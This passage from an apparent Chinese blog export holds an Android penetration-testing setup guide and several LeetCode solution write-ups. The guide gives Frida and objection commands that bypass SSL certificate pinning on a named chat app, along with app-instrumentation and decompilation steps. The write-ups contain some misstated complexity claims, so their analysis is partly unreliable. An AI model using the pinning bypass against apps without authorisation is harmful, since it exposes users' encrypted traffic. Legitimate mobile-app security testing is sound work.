    <url>/android/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%B8%80/</url>
    <content><![CDATA[<p>因为很多时候测试涉及到小程序和app的测试，而测试过程中可能遇到一些阻隔，所以开始学习android测试。</p>
<a id="more"></a>

<h1><span id="hook工具环境安装">hook工具环境安装</span></h1><p>用到工具</p>
<ul>
<li>夜深模拟器</li>
<li>adb</li>
</ul>
<h2><span id="首先用adb调试夜神模拟器">首先用adb调试夜神模拟器。</span></h2><p>先查看adb版本：</p>
<p><img src="/assets/image-20200607155844624.png" alt="image-20200607155844624"></p>
<p>然后找到夜深浏览器所在目录，使用nox_adb.exe查看版本：</p>
<p>[注]如何快速查找这两个工具所在位置用utool就可以。</p>
<p><img src="/assets/image-20200607160116200.png" alt="image-20200607160116200"></p>
<p>发现两个工具版本不一样。</p>
<p>如果直接运行adb devices是不成功的。</p>
<p><img src="/assets/image-20200607160225606.png" alt="image-20200607160225606"></p>
<p>现在将nox_adb.exe改为nox_adb_bak.exe</p>
<p>然后把adb.exe拷贝到夜神模拟器所在路径并改名为nox_adb.exe</p>
<p><img src="/assets/image-20200607160725005.png" alt="image-20200607160725005"></p>
<p>再次执行发现还是</p>
<p><img src="/assets/image-20200607160909672.png" alt="image-20200607160909672"></p>
<p>然后发现夜神由于打游戏用的平板模式，换成手机模式就好了：</p>
<p><img src="/assets/image-20200607161207168.png" alt="image-20200607161207168"></p>
<h2><span id="手机burp证书安装">手机burp证书安装</span></h2><p>（1）burp导出证书并修改后缀名为.cer</p>
<p>（2）adb push 证书路径 /mnt/sdcard/gwolfs/cacert.cer</p>
<p>（3）在手机上安装证书。</p>
<p>设置-安全-从SD卡安装证书</p>
<p>（4）配置代理</p>
<p>[注]</p>
<ul>
<li>安卓文件系统的默认路径是：</li>
</ul>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/storage/</span>emulated<span class="regexp">/0/</span></span><br></pre></td></tr></table></figure>

<p>但是该路径是read-only的。</p>
<ul>
<li>adb shell 后面可以执行linux系统命令</li>
</ul>
<p><img src="/assets/image-20200607162415591.png" alt="image-20200607162415591"></p>
<p><img src="/assets/image-20200607162613685.png" alt="image-20200607162613685"></p>
<p><img src="/assets/image-20200607163557925.png" alt="image-20200607163557925"></p>
<p><img src="/assets/image-20200607170223141.png" alt="image-20200607170223141"></p>
<p><img src="/assets/image-20200607170238703.png" alt="image-20200607170238703"></p>
<p><img src="/assets/image-20200607170759437.png" alt="image-20200607170759437"></p>
<h2><span id="安装frida">安装Frida</span></h2><p>(1)pip install frida</p>
<p>(2)github下载frida-server</p>
<p>(3)adb push放入手机目录里</p>
<p><img src="/assets/image-20200607171032384.png" alt="image-20200607171032384"></p>
<p>（4）chmod 777 赋予赋予执行权限</p>
<p><img src="/assets/image-20200607171427354.png" alt="image-20200607171427354"></p>
<p>（5）启动frida-server服务器</p>
<p><img src="/assets/image-20200607171513728.png" alt="image-20200607171513728"></p>
<p>发现不对。想了想CPU架构有问题，夜神模拟器底层的CPU是基于本机的，是intel的，不是arm的，所以换成x86的导入即可。</p>
<p><img src="/assets/image-20200607171823766.png" alt="image-20200607171823766"></p>
<p>（6）在windows上使用<code>firda-ps -U</code>列出所有进程</p>
<p><img src="/assets/image-20200607171938655.png" alt="image-20200607171938655"></p>
<p>成功列出，环境搭建成功。</p>
<h2><span id="安装xposed">安装Xposed</span></h2><p>下载xposed安装apk</p>
<p>android5.0以下：</p>
<p><a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
<p>android5.0以上：</p>
<p><a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">https://forum.xda-developers.com/showthread.php?t=3034811</a></p>
<p>注意安装xposed需要root权限。</p>
<p>安装apk后发现</p>
<p><img src="/assets/image-20200609224324994.png" alt="image-20200609224324994"></p>
<p>点击下面的安装，下载完成后安装成功。</p>
<p><img src="/assets/image-20200609225733881.png" alt="image-20200609225733881"></p>
<h1><span id="app抓包">App抓包</span></h1><h2><span id="ssl-pinning">SSL pinning</span></h2><h2><span id="绕过证书锁定">绕过证书锁定</span></h2><p>注意一点，当前frida-server不是以后台服务启动的，需要加个&amp;作为后台服务启动</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">./frida-server<span class="meta">&amp;</span></span><br></pre></td></tr></table></figure>

<p>先前说到，利用<code>frida-ps -U</code>可以列举出模拟器中的所有进程。</p>
<p>绕过证书锁定的原理是注入进程。所以可以根据列举进程命令找到需要注入的进程ID和名字，然后使用frida进行注入。</p>
<p>（1）首先模拟器上打开app。</p>
<p>（2）查看进程</p>
<p><img src="/assets/image-20200607190745464.png" alt="image-20200607190745464"></p>
<p>发现两个进程号。</p>
<p>注意frida写python脚本时：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">get_remote_device</span><span class="params">()</span></span>   <span class="comment">//模拟器使用这个</span></span><br><span class="line"><span class="function"><span class="title">get_usb_device</span><span class="params">()</span></span>    <span class="comment">//usb设备用这个</span></span><br></pre></td></tr></table></figure>





<p>绕过脚本来源：<a href="https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/" target="_blank" rel="noopener">https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</a></p>
<p>因为脚本中会用到burp证书，所以先把burp证书复制到与frida-server一个目录下。</p>
<p><img src="/assets/image-20200607180032085.png" alt="image-20200607180032085"></p>
<p>然后执行脚本：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">frida</span> <span class="selector-tag">-U</span> <span class="selector-tag">-f</span> <span class="selector-tag">com</span><span class="selector-class">.feiliao</span><span class="selector-class">.flipchat</span><span class="selector-class">.android</span> <span class="selector-tag">-l</span> <span class="selector-tag">frida-android-repinning</span><span class="selector-class">.js</span> <span class="selector-tag">--no-pause</span></span><br></pre></td></tr></table></figure>

<p>成功注入：</p>
<p><img src="/assets/image-20200607190844347.png" alt="image-20200607190844347"></p>
<p>不知道为什么爆红了，但实际抓包成功。</p>
<p><img src="/assets/image-20200607191013245.png" alt="image-20200607191013245"></p>
<h2><span id="objection">Objection</span></h2><p>发现objection工具自动的可以绕过。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install objection</span><br></pre></td></tr></table></figure>

<h3><span id="方法一-动态交互式界面hook">方法一 动态交互式界面hook</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">objection</span> <span class="selector-tag">-g</span> <span class="selector-tag">com</span><span class="selector-class">.feiliao</span><span class="selector-class">.flipchat</span><span class="selector-class">.android</span> <span class="selector-tag">explore</span></span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200607191337324.png" alt="image-20200607191337324"></p>
<ul>
<li><p>环境变量</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">env</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/assets/image-20200607191439337.png" alt="image-20200607191439337"></p>
<ul>
<li>列举出所有activity.</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">android hooking list activities        #还支持列举<span class="class"><span class="keyword">class</span>,<span class="type">services。</span></span></span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200607203150653.png" alt="image-20200607203150653"></p>
<ul>
<li>memory管理</li>
</ul>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">memory</span> <span class="keyword">list</span> modules       查看当前进程的内存情况</span><br><span class="line"><span class="keyword">memory</span> <span class="keyword">search</span> --string --offsets-only  搜索内存</span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200607203457762.png" alt="image-20200607203457762"></p>
<ul>
<li>hook方式</li>
</ul>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">android </span>hooking watch class_method 包名.类名.方法名</span><br><span class="line"><span class="keyword">android </span>hooking watch class 包名.类名</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令行命令</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">android</span> shell_exec<span class="meta"> [command]</span></span><br><span class="line">[command]</span><br></pre></td></tr></table></figure>

<ul>
<li>下载文件</li>
</ul>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span> download 目标文件 存放地址</span><br></pre></td></tr></table></figure>

<ul>
<li>启动activies/services</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">android <span class="built_in">int</span>ent lanuch_activity [活动名]</span><br><span class="line">android <span class="built_in">int</span>ent launch_service [类名]</span><br></pre></td></tr></table></figure>

<ul>
<li>绕过 sslpinning </li>
</ul>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">android </span>sslpinning disable</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200607205622609.png" alt="image-20200607205622609"></p>
<h3><span id="方法二-重新打包apk">方法二 重新打包apk</span></h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">objection patchapk <span class="comment">--source app-release.apk</span></span><br></pre></td></tr></table></figure>





<p><img src="/assets/image-20200607205914084.png" alt="image-20200607205914084"></p>
<p>objection 出现Timeout Error</p>
<p>网上也不建议采用这种方式注入。</p>
<h1><span id="逆向工具安装">逆向工具安装</span></h1><h2><span id="jeb">JEB</span></h2><p>JEB是类似于IDA的android逆向工具，从吾爱破解爱盘3.0下载pro版本的即可。免安装。</p>
<p>测试：<br><img src="/assets/image-20200608102044844.png" alt="image-20200608102044844"></p>
<p>可以看出会apk文件包含资源文件和字节码，JEB可以分析字节码并点击解析可以逆向为android文件。</p>
<h2><span id="apktool">Apktool</span></h2><p>下载是个jar包，利用</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">apktool</span><span class="selector-class">.jar</span> <span class="selector-tag">d</span> 目标文件</span><br></pre></td></tr></table></figure>

<p>即可反汇编。</p>
<h2><span id="jadx">Jadx</span></h2><p>有gui和图形界面，直接使用即可。</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode128-最长连续序列</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode128-%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%BA%8F%E5%88%97/</url>
    <content><![CDATA[<p>给定一个未排序的整数数组，找出最长连续序列的长度。</p>
<p>要求算法的时间复杂度为 O(n)。</p>
<p>示例:</p>
<p>输入: [100, 4, 200, 1, 3, 2]<br>输出: 4<br>解释: 最长连续序列是 [1, 2, 3, 4]。它的长度为 4。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/longest-consecutive-sequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-consecutive-sequence</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<h2><span id="方法一-插入排序算法">方法一、插入排序算法。</span></h2><p>首先插入排序，然后扫描一遍，求出最大连续长度。时间复杂度o(n^2)，空间复杂度o(n)</p>
<h2><span id="方法二-内外循环判断法">方法二、内外循环判断法</span></h2><p>外层循环为从开始扫描到终点。</p>
<p>内层循环为对每一个数num,扫描整个数组看num-1是否存在。</p>
<p>如果num-1不存在，则找到num+1,num+2,…一直找到num+n。</p>
<p>如果num-1存在，则因为num-1为连续序列的起点肯定比num好，所以不需再寻找。</p>
<p>这样的时间复杂度为O(n^2)</p>
<p>我们可以将时间复杂度降低一下，最开始用一个集合来存所有数。然后每次判断的时候判断num-1是否在集合里即可。</p>
<p>注意HashSet底层是HashMap，查询时间复杂度为O(1).所以整个算法的平均时间复杂度为o(n)，空间复杂度为o(n)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">if</span>(!set.contains(num-<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="keyword">int</span> len = <span class="number">1</span>;</span><br><span class="line">                num = num+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(set.contains(num))&#123;</span><br><span class="line">                    num++;</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">                maxLen = maxLen&gt;len?maxLen:len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<p><img src="/assets/image-20200606095540690.png" alt="image-20200606095540690"></p>
<h2><span id="方法三-treeset方法">方法三、TreeSet方法</span></h2><p>TreeSet可以自动排序，所以可以采用TreeSet的方法。TreeSet查询时间复杂度为o(nlogn)，新增复杂度为o(nlogn)。</p>
<p>这样时间复杂度为o(nlogn)，空间复杂度为o(n)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeSet&lt;Integer&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            treeSet.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lastNum = treeSet.pollFirst();</span><br><span class="line">        <span class="keyword">int</span> curLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num:treeSet) &#123;</span><br><span class="line">            <span class="keyword">if</span>(lastNum + <span class="number">1</span> == num)&#123;</span><br><span class="line">                curLen++;</span><br><span class="line">                lastNum = num;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(lastNum == num)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                maxLen = curLen&gt;maxLen?curLen:maxLen;</span><br><span class="line">                lastNum = num;</span><br><span class="line">                curLen = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        maxLen = curLen&gt;maxLen?curLen:maxLen;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200606102923384.png" alt="image-20200606102923384"></p>
<h2><span id="方法四-使用并查集思想">方法四、使用并查集思想</span></h2><p>并查集包含两个动作，查找和合并。</p>
<p>此处查找为查找根节点。合并为合并两个相邻节点。但是其实合并没必要，所以将并查集做了优化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Integer,Integer&gt; set = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    HashMap&lt;Integer,Integer&gt; count = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set.containsKey(num-<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">int</span> value = set.get(num-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(value != num-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//代表找过</span></span><br><span class="line">                set.put(num,value);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//代表没找过</span></span><br><span class="line">                value = find(value);</span><br><span class="line">                set.put(num, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            set.put(num,num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:set.keySet())&#123;</span><br><span class="line">            <span class="keyword">int</span> parent = set.get(i);</span><br><span class="line">            <span class="keyword">if</span>(parent == i)&#123;</span><br><span class="line">                parent = find(i);</span><br><span class="line">            &#125;</span><br><span class="line">            Integer value = count.get(parent);</span><br><span class="line">            <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">                value = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            value += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(value &gt; maxLen)&#123;</span><br><span class="line">                maxLen = value;</span><br><span class="line">            &#125;</span><br><span class="line">            count.put(parent,value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><img src="/assets/image-20200606133225708.png" alt="image-20200606133225708"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode238-除自身以外数组的乘积</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode238-%E9%99%A4%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E6%95%B0%E7%BB%84%E7%9A%84%E4%B9%98%E7%A7%AF/</url>
    <content><![CDATA[<p>给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。</p>
<p>示例:</p>
<p>输入: [1,2,3,4]<br>输出: [24,12,8,6]</p>
<p>提示：题目数据保证数组之中任意元素的全部前缀元素和后缀（甚至是整个数组）的乘积都在 32 位整数范围内。</p>
<p>说明: 请不要使用除法，且在 O(n) 时间复杂度内完成此题。</p>
<p>进阶：<br>你可以在常数空间复杂度内完成这个题目吗？（ 出于对空间复杂度分析的目的，输出数组不被视为额外空间。）</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/product-of-array-except-self" target="_blank" rel="noopener">https://leetcode-cn.com/problems/product-of-array-except-self</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>要求除本身外数组的乘积，只需要将数字左右的乘积相乘即可。假设</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">dp[<span class="string">i</span>][<span class="symbol">j</span>]为nums[i]<span class="emphasis">*nums[i+1]*</span>...*nums[j];</span><br></pre></td></tr></table></figure>

<p>所以</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">sums[<span class="string">i</span>]=dp[<span class="string">0</span>][<span class="symbol">i-1</span>]*dp[<span class="string">i+1</span>][<span class="symbol">len</span>]</span><br></pre></td></tr></table></figure>

<p>状态转移方程：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">dp[<span class="string">i</span>][<span class="symbol">j</span>]=dp[<span class="string">i</span>][<span class="symbol">j-1</span>]*nums[j]</span><br></pre></td></tr></table></figure>

<p>方向是从0~len.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] productExceptSelf(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[len][len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j == i) &#123;</span><br><span class="line">                    dp[i][i] = nums[i];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j] = dp[i][j - <span class="number">1</span>] * nums[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] sum = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">        sum[<span class="number">0</span>]=dp[<span class="number">1</span>][len-<span class="number">1</span>];</span><br><span class="line">        sum[len-<span class="number">1</span>]=dp[<span class="number">0</span>][len-<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            sum[i] = dp[<span class="number">0</span>][i-<span class="number">1</span>]*dp[i+<span class="number">1</span>][len-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>这样虽然对，但是超出内存限制了。题目要求o(1)时间复杂度，所以需要重新调整过。</p>
<p>看下状态转移方程表格：<br><img src="/assets/image-20200604105752184.png" alt="image-20200604105752184"></p>
<p>再看下sum是怎么计算的：</p>
<p><img src="/assets/image-20200604110018249.png" alt="image-20200604110018249"></p>
<p>可以重新算状态转移表格：</p>
<p><img src="/assets/image-20200604111653691.png" alt="image-20200604111653691"></p>
<p>其实很简单的一个表格，用几个中间变量表示即可。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">leftValue 代表左面计算乘积，初始化为<span class="number">1</span>。</span><br><span class="line">rightValue 代表右面计算乘积，初始化为<span class="number">1.</span></span><br><span class="line"></span><br><span class="line">注意右面乘积的计算只需要从num[j+<span class="number">1</span>]*...num[len<span class="number">-1</span>]即可，</span><br><span class="line">但是左面计算乘积需要记录上一次的左面乘积，这样就可以防止重复计算。</span><br><span class="line">所以用lastLeftValue代表上次计算的左面乘积。则leftValue=lastLeftValue*nums[j<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<p>所以最后的代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> len = nums.length;</span><br><span class="line"><span class="keyword">int</span>[] sum = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line"><span class="keyword">int</span> lastLeftValue = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt; len;i++)&#123;</span><br><span class="line">    <span class="keyword">int</span> leftValue = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightValue = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">            rightValue *= nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == len-<span class="number">1</span>)&#123;</span><br><span class="line">        leftValue = lastLeftValue*nums[i-<span class="number">1</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        leftValue = lastLeftValue*nums[i-<span class="number">1</span>];</span><br><span class="line">        lastLeftValue = leftValue;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">            rightValue *= nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sum[i] = leftValue*rightValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200604113840186.png" alt="image-20200604113840186"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode152-乘积最大子数组</title>
    <url>/%E7%AE%97%E6%B3%95/Leetcode152-%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。</p>
<p>示例 1:</p>
<p>输入: [2,3,-2,4]<br>输出: 6<br>解释: 子数组 [2,3] 有最大乘积 6。<br>示例 2:</p>
<p>输入: [-2,0,-1]<br>输出: 0<br>解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。</p>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/maximum-product-subarray" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-product-subarray</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<a id="more"></a>

<p>假设dp[j] 为从以nums[j]结尾的最大的乘积和</p>
<p>分析一下，其实</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">dp[j] 和[j<span class="number">-1</span>]无关</span><br><span class="line">e.g. a=[<span class="number">1</span>,<span class="number">-2</span>,<span class="number">3</span>,<span class="number">-4</span>]</span><br><span class="line">dp[<span class="number">2</span>]=<span class="number">3</span></span><br><span class="line">dp[<span class="number">3</span>]=<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p>对于当前数num=nums[j]。</p>
<p>若num&gt;0。则希望乘一个最大的整数</p>
<p>若num&lt;0，则希望乘一个最小的负数。</p>
<p>所以对于dp[j]应该维护两个数组，最大正数数组dpmax，最小负数数组min。</p>
<p>$$ dpmax[j] = max(dpmax[j-1]<em>nums[j],dpmin[j-1]</em>nums[j],nums[j])$$<br>$$ dpmin[j] = min(dpmax[j-1]<em>nums[j],dpmin[j-1]</em>nums[j],nums[j])$$</p>
<p>再简化一下用两个变量dpmax,dpmin节省空间复杂度：</p>
<p>$$dpmax=max(dpmax<em>nums[j],dpmin</em>nums[j],nums[j])$$</p>
<p>$$ dpmin = min(dpmax<em>nums[j],dpmin</em>nums[j],nums[j])$$</p>
<p>用maxValue记录最大值。</p>
<p>如果dpmax&gt;maxValue则，更新最大值。</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dpmax,dpmin,maxValue;</span><br><span class="line">        dpmax = nums[<span class="number">0</span>];</span><br><span class="line">        dpmin = nums[<span class="number">0</span>];</span><br><span class="line">        maxValue = dpmax;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmpValue1 = dpmax*nums[i];</span><br><span class="line">            <span class="keyword">int</span> tmpValue2 = dpmin*nums[i];</span><br><span class="line">            dpmax = Math.max(Math.max(tmpValue1,tmpValue2),nums[i]);</span><br><span class="line">            dpmin = Math.min(Math.min(tmpValue1,tmpValue2),nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(dpmax&gt;maxValue)&#123;</span><br><span class="line">                maxValue = dpmax;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200604095416178.png" alt="image-20200604095416178"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode974-和可被K整除的子数组</title>
    <url>/uncategorized/Leetcode974-%E5%92%8C%E5%8F%AF%E8%A2%ABK%E6%95%B4%E9%99%A4%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>给定一个整数数组 A，返回其中元素之和可被 K 整除的（连续、非空）子数组的数目。</p>
<p>示例：</p>
<p>输入：A = [4,5,0,-2,-3,1], K = 5<br>输出：7<br>解释：<br>有 7 个子数组满足其元素之和可被 K = 5 整除：<br>[4, 5, 0, -2, -3, 1], [5], [5, 0], [5, 0, -2, -3], [0], [0, -2, -3], [-2, -3]</p>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 30000</code></li>
<li><code>-10000 &lt;= A[i] &lt;= 10000</code></li>
<li><code>2 &lt;= K &lt;= 10000</code></li>
</ol>
